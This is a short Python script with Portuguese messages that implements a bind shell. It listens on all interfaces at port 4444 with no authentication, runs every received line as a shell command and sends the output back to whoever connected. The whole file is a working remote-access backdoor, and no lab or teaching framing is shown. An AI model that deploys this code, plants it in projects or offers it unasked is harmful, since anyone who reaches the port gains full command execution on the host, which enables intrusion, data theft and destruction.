import socket
import subprocess
import os

HOST = '0.0.0.0'
PORT = 4444

def handle_client(conn, addr):
    conn.sendall(b"COnectado ao Shell remoto python\n$ ")

    while True:
        try:
            data = conn.recv(1024).decode('utf-8').strip()
            if not data or data.lower() == 'exit':
                break
            proc = subprocess.run(data, shell=True, capture_output=True, text=True, timeout=10)
            output = proc.stdout + proc.stderr
            conn.sendall(output.encode('utf-8'))
            conn.sendall(b"\n$ ")

        except ConnectionResetError:
            print(f"Conexão perdida com {addr}")
            break
        except subprocess.TimeoutExpired:
            timeout_msg = "Comando expirou após 10 segundos.\n"
            conn.sendall(timeout_msg.encode('utf-8'))
            conn.sendall(b"\n$ ")
        except Exception as e:
            error_message = f"Erro na execução: {str(e)}\n"
            conn.sendall(error_message.encode('utf-8'))
            conn.sendall(b"\n$ ")
            print(f"Erro inesperado: {e}")
            break
    conn.close()

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        server_socket.bind((HOST, PORT))
        server_socket.listen(1)

        while True:
            conn, addr = server_socket.accept()
            handle_client(conn, addr)

    except KeyboardInterrupt:
        print("\nServidor encerrado por usuário (Ctrl+C).")
    except Exception as e:
        print(f"Um erro fatal ocorreu: {e}")
    finally:
        server_socket.close()

if __name__ == "__main__":
    start_server()
